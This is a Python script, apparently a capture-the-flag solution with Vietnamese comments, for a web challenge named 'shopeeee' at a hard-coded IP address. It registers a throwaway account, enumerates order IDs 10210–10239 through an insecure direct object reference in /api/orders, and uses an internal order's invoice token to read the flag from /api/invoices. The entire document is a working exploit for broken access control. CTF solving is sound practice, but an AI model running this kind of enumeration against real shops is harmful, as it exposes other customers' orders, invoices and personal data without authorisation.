#!/usr/bin/env python3
# shopeeee — IDOR trên /api/orders/{id} và /api/invoices/{token}
import json, urllib.request, http.cookiejar

B = "http://103.116.52.180:33774"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
def call(path, data=None):
    r = urllib.request.Request(B + path,
        data=json.dumps(data).encode() if data else None,
        headers={"Content-Type": "application/json"})
    return json.load(op.open(r, timeout=15))

# 1) Đăng ký một tài khoản thường (để có session cookie)
import random
u = "u%d" % random.randint(1000, 99999)
call("/api/auth/register", {"username": u, "email": u + "@x.com",
                            "password": "secret123", "confirm_password": "secret123"})

# 2) IDOR: robots.txt gợi ý "don't see id 1021x" -> quét order 10210..10239
for oid in range(10210, 10240):
    try:
        o = call("/api/orders/%d" % oid)
    except Exception:
        continue
    if o.get("payment_method") == "INTERNAL" and o.get("invoice", {}).get("token"):
        token = o["invoice"]["token"]
        # 3) Đọc invoice INTERNAL -> verification_code chính là flag
        inv = call("/api/invoices/" + token)
        print("order:", oid, "buyer:", o["buyer"]["username"])
        print("flag:", inv["verification_code"])
        break
